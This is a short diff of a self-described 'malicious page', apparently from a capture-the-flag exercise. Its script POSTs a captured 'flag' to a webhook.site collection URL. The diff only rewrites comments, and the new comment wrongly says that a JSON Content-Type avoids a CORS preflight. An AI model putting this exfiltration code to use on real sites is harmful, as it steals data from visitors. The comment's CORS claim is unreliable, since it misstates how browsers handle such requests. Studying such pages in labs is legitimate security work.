@@ -6,12 +6,12 @@
 <body>
     <h1>Welcome to My Malicious Page</h1>
     <script>
-        // Function to bypass OPTIONS request by directly sending the POST request.
+        // Function to send the payload directly without triggering OPTIONS
         function sendPayload(flag) {
             fetch("https://webhook.site/0bd8b95b-3b87-4edf-96d6-06a0c337d524", {
                 method: "POST",
                 headers: {
-                    "Content-Type": "application/json"
+                    "Content-Type": "application/json" // Simple header to avoid CORS preflight
                 },
                 body: JSON.stringify({ flag: flag })
             })
